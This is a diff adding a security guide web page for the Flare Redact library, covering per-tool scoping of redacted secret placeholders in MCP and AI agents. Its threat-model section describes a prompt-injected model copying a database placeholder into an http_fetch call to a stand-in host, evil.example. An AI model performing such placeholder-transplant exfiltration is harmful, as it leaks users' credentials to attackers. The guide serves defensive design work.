@@ -1,0 +1,129 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Secure Secret Redaction for MCP and AI Tools | Flare Redact</title>
+  <meta name="description" content="Prevent cross-tool secret restoration in MCP and AI agents. Scope reversible placeholders to trusted tools and block placeholder-transplant exfiltration.">
+  <link rel="canonical" href="https://flare-collection.github.io/flare-redact/guides/mcp-tool-redaction/">
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Secure Secret Redaction for MCP and AI Tools">
+  <meta property="og:description" content="Bind reversible placeholders to trusted tool scopes so one tool cannot restore another tool's secrets.">
+  <meta property="og:url" content="https://flare-collection.github.io/flare-redact/guides/mcp-tool-redaction/">
+  <meta name="twitter:card" content="summary">
+  <link rel="stylesheet" href="../../site.css">
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "TechArticle",
+    "headline": "Secure secret redaction for MCP and AI tools",
+    "description": "A threat-driven guide to scoped placeholder restoration in multi-tool AI agents.",
+    "datePublished": "2026-08-04",
+    "dateModified": "2026-08-04",
+    "author": { "@type": "Person", "name": "Umud Hasanli", "url": "https://github.com/umudhasanli" },
+    "publisher": { "@type": "Organization", "name": "Flare Collection", "url": "https://github.com/flare-collection" },
+    "mainEntityOfPage": "https://flare-collection.github.io/flare-redact/guides/mcp-tool-redaction/",
+    "proficiencyLevel": "Advanced",
+    "dependencies": "flare-redact 1.4 or newer"
+  }
+  </script>
+</head>
+<body>
+  <nav class="site-nav" aria-label="Main navigation">
+    <div class="inner">
+      <a class="brand" href="../../">flare<span>-redact</span></a>
+      <div class="nav-links">
+        <a href="../">Guides</a>
+        <a href="https://github.com/flare-collection/flare-redact">GitHub</a>
+        <a href="https://www.npmjs.com/package/flare-redact">npm</a>
+      </div>
+    </div>
+  </nav>
+
+  <main class="page">
+    <div class="breadcrumbs"><a href="../../">Home</a> / <a href="../">Guides</a> / MCP tool redaction</div>
+    <p class="eyebrow">Agent and MCP security guide</p>
+    <h1>Secure secret redaction for MCP and AI tools</h1>
+    <p class="lede">Reversible redaction needs an authorization boundary. In a multi-tool agent, each placeholder should be restorable only by the tool or trust domain that originally exposed it.</p>
+    <p class="meta">By <a href="https://github.com/umudhasanli">Umud Hasanli</a> · Updated August 4, 2026 · Examples tested with Flare Redact 1.4</p>
+
+    <div class="answer"><strong>Short answer:</strong> use <code>createScopedToolBoundary()</code>, assign scopes in your trusted tool registry, redact a result under the executed tool's scope, and restore a future call only under the destination scope resolved by application code.</div>
+
+    <h2>The cross-tool placeholder problem</h2>
+    <p>Suppose a database tool returns a connection string. The model sees only an opaque placeholder. A prompt-injected model does not need to know the secret to try to exfiltrate it: it can copy that placeholder into an HTTP tool's URL.</p>
+    <pre><code>database result → [FR_POSTGRES_URL_opaque]
+
+model proposes:
+http_fetch({ url: 'https://evil.example/?x=[FR_POSTGRES_URL_opaque]' })</code></pre>
+    <p>If one shared vault blindly restores every known placeholder before every tool call, the HTTP request receives the original connection string. The model never saw the value, but it still moved authority between tools.</p>
+
+    <h2>Create a scoped boundary</h2>
+    <pre><code>import { createScopedToolBoundary } from 'flare-redact/tool';
+
+const boundary = createScopedToolBoundary();
+
+const databaseResult = 'postgres://admin:secret@db/prod';
+const safeResult = boundary.redactForModel(
+  'database',
+  databaseResult
+);</code></pre>
+    <p>The boundary creates an independent vault for the <code>database</code> scope. The placeholder can be restored in that scope, but remains opaque in <code>http_fetch</code>.</p>
+    <pre><code>boundary.restoreForTool('http_fetch', safeResult);
+// still [FR_POSTGRES_URL_...]
+
+boundary.restoreForTool('database', safeResult);
+// postgres://admin:secret@db/prod</code></pre>
+
+    <h2>Resolve scope from trusted routing</h2>
+    <p>A model-produced tool name is untrusted input. Your application must resolve that name against the same registry used to authorize and execute tools, then pass the registry-owned scope to the boundary.</p>
+    <pre><code>const proposedCall = await model.generateToolCall(modelContext);
+
+// Registry validation owns tool identity and scope.
+const acceptedTool = toolRegistry.resolve(proposedCall.name);
+
+const localCall = boundary.restoreForTool(
+  acceptedTool.scope,
+  proposedCall
+);
+
+const result = await acceptedTool.execute(localCall.args);
+
+const safeForModel = boundary.redactForModel(
+  acceptedTool.scope,
+  result
+);</code></pre>
+    <div class="note"><strong>Do not</strong> accept a scope string supplied by the model. That would turn the authorization check back into attacker-controlled data.</div>
+
+    <h2>Restore at the final application boundary</h2>
+    <p><code>restoreForApp()</code> can restore placeholders from every scope for a trusted final response. Call it only where the application is authorized to display the originals.</p>
+    <pre><code>const finalForUser = boundary.restoreForApp(modelAnswer);
+
+// Clear one tool when its authorization ends.
+boundary.reset('database');
+
+// Or clear the whole conversation.
+boundary.reset();</code></pre>
+    <p>Unknown placeholders are left unchanged, scope creation is bounded, and placeholder collisions across scopes fail closed.</p>
+
+    <h2>When the legacy boundary is acceptable</h2>
+    <p><code>createToolBoundary()</code> remains available for a single tool or one trust domain. It intentionally restores any placeholder in its shared vault. Do not reuse one legacy boundary across tools that have different network access, credentials, tenants, or data permissions.</p>
+
+    <h2>Agent boundary checklist</h2>
+    <ul>
+      <li>Use one scope per authorization domain, not merely one label per UI button.</li>
+      <li>Resolve tools and scopes from application-owned configuration.</li>
+      <li>Apply ordinary schema validation and allowlists after restoration and before execution.</li>
+      <li>Keep vault mappings local, short-lived, bounded, and out of telemetry.</li>
+      <li>Reset scopes when a conversation, tenant, credential, or authorization context ends.</li>
+      <li>Treat final application restoration as privileged output handling.</li>
+    </ul>
+
+    <div class="next">
+      <h2>Test the attack path</h2>
+      <p>Run the <a href="https://github.com/flare-collection/flare-redact/tree/main/examples/universal-boundaries">universal-boundaries example</a>. It asserts both allowed same-scope restoration and blocked cross-tool placeholder transplantation.</p>
+    </div>
+  </main>
+
+  <footer class="site-footer">Flare Redact · MIT · <a href="https://github.com/flare-collection/flare-redact/blob/main/MIGRATION.md">migration and security guidance</a></footer>
+</body>
+</html>
